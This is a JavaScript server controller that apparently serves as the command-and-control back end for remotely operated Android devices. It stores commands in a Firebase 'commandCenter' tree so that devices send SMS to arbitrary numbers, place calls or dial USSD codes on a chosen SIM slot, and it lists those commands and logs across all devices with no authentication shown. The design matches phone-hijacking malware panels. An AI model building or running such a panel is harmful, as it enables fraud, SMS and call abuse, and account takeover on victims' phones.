import { rtdb } from "../config/db.js";

const ROOT = "commandCenter";

/* ============================================================
   ⭐ SEND COMMAND (POST API)
============================================================ */
export const handleDeviceCommand = async (req, res) => {
  try {
    const { uniqueid, action, to, body, code, simSlot } = req.body;

    if (!uniqueid || !action) {
      return res.json({ success: false, message: "Missing action or uniqueid" });
    }

    const timestamp = Date.now();

    let commandData = {
      action,
      simSlot: simSlot ?? "",
      timestamp,
    };

    // ⭐ SMS COMMAND
    if (action === "sms") {
      commandData.to = to;
      commandData.body = body;

      await rtdb.ref(`${ROOT}/commands/${uniqueid}/sms`).push({
        to,
        body,
        simSlot,
        timestamp,
      });
    }

    // ⭐ CALL / USSD COMMAND
    if (action === "call" || action === "ussd") {
      commandData.code = code;

      await rtdb.ref(`${ROOT}/commands/${uniqueid}/calls`).push({
        code,
        simSlot,
        timestamp,
      });
    }

    // ⭐ Send command to device (Android listener)
    await rtdb.ref(`${ROOT}/deviceCommands/${uniqueid}`).set(commandData);

    // ⭐ Save global log
    await rtdb.ref(`${ROOT}/logs`).push({
      uniqueid,
      ...commandData,
      loggedAt: timestamp,
    });

    return res.json({
      success: true,
      message: `${action} command sent`,
      data: commandData,
    });

  } catch (err) {
    console.error("❌ ERROR:", err);
    return res.status(500).json({
      success: false,
      message: "Server error",
    });
  }
};

/* ============================================================
   ⭐ GET ALL COMMANDS OF ALL DEVICES
============================================================ */
export const getAllCommands = async (req, res) => {
  try {
    const snap = await rtdb.ref(`${ROOT}/commands`).get();

    if (!snap.exists()) {
      return res.json({ success: true, data: [] });
    }

    const result = [];
    const raw = snap.val();

    Object.entries(raw).forEach(([deviceId, cmdTypes]) => {
      Object.entries(cmdTypes).forEach(([type, list]) => {
        Object.entries(list).forEach(([cmdId, obj]) => {
          result.push({
            id: cmdId,
            uniqueid: deviceId,
            type,
            ...obj,
          });
        });
      });
    });

    result.sort((a, b) => b.timestamp - a.timestamp);

    return res.json({ success: true, data: result });

  } catch (err) {
    console.error("❌ ERROR:", err);
    return res.status(500).json({ success: false, message: "Server error" });
  }
};

/* ============================================================
   ⭐ GET ALL COMMANDS FOR ONE DEVICE
============================================================ */
export const getCommandsByDevice = async (req, res) => {
  try {
    const { uniqueid } = req.params;

    const snap = await rtdb.ref(`${ROOT}/commands/${uniqueid}`).get();

    if (!snap.exists()) {
      return res.json({ success: true, data: [] });
    }

    const data = snap.val();
    const list = [];

    Object.entries(data).forEach(([type, items]) => {
      Object.entries(items).forEach(([cmdId, obj]) => {
        list.push({
          id: cmdId,
          uniqueid,
          type,
          ...obj,
        });
      });
    });

    list.sort((a, b) => b.timestamp - a.timestamp);

    return res.json({ success: true, data: list });

  } catch (err) {
    console.error("❌ ERROR:", err);
    return res.status(500).json({ success: false, message: "Server error" });
  }
};

/* ============================================================
   ⭐ GET LATEST COMMAND FOR ONE DEVICE
============================================================ */
export const getLatestCommandByDevice = async (req, res) => {
  try {
    const { uniqueid } = req.params;

    const snap = await rtdb.ref(`${ROOT}/commands/${uniqueid}`).get();

    if (!snap.exists()) {
      return res.json({ success: true, data: [] });
    }

    const raw = snap.val();
    const list = [];

    Object.entries(raw).forEach(([type, items]) => {
      Object.entries(items).forEach(([cmdId, obj]) => {
        list.push({
          id: cmdId,
          uniqueid,
          type,
          ...obj,
        });
      });
    });

    list.sort((a, b) => b.timestamp - a.timestamp);

    return res.json({ success: true, data: list.slice(0, 1) });

  } catch (err) {
    console.error("❌ ERROR:", err);
    res.status(500).json({ success: false, message: "Server error" });
  }
};

/* ============================================================
   ⭐ GET GLOBAL LOGS
============================================================ */
export const getCommandLogs = async (req, res) => {
  try {
    const snap = await rtdb.ref(`${ROOT}/logs`).get();

    if (!snap.exists()) {
      return res.json({ success: true, data: [] });
    }

    const raw = snap.val();
    const list = Object.entries(raw).map(([id, obj]) => ({
      id,
      ...obj,
    }));

    list.sort((a, b) => b.loggedAt - a.loggedAt);

    return res.json({ success: true, data: list });

  } catch (err) {
    console.error("❌ ERROR:", err);
    res.status(500).json({ success: false, message: "Server error" });
  }
};
